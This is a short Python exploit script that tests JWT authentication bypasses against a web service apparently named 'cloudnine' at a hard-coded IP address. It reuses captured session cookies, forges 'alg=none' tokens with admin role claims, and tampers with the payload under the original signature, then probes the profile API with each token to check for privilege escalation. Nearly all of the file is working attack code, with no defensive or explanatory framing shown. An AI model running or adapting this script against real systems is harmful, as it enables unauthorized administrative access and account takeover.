import requests, json, base64
BASE='http://15.252.91.100'
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64d(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))

cookies=json.load(open('cn_cookies.json'))
orig=cookies['cloudnine_access']
h,p,sig=orig.split('.')
payload=json.loads(b64d(p)); header=json.loads(b64d(h))
print('header',header); print('payload',payload)

def prof(tok, label, extra=None):
    jar={'cloudnine_access':tok}
    if extra: jar.update(extra)
    r=requests.get(BASE+'/api/profile/', cookies=jar, headers={'User-Agent':'M'}, timeout=15)
    print(f'[{label}] {r.status_code}: {r.text[:260]}')

# baseline: only the real JWT, no session
prof(orig,'real JWT only')

# alg=none, role admin, only JWT
pl=dict(payload); pl['role']='admin'; pl['is_admin']=True
for alg in ['none','HS256']:
    hdr={'alg':alg,'typ':'JWT','kid':'cloudnine-prod'}
    if alg=='none':
        tok=b64u(json.dumps(hdr))+'.'+b64u(json.dumps(pl))+'.'
        prof(tok,'alg=none only-jwt')
# invalid sig RS256
pl2=dict(payload); pl2['role']='admin'
tok=h+'.'+b64u(json.dumps(pl2))+'.'+sig
prof(tok,'RS256 tamper only-jwt')
# no cookie at all
r=requests.get(BASE+'/api/profile/', headers={'User-Agent':'M'}, timeout=15)
print('[no cookie]',r.status_code, r.text[:200])
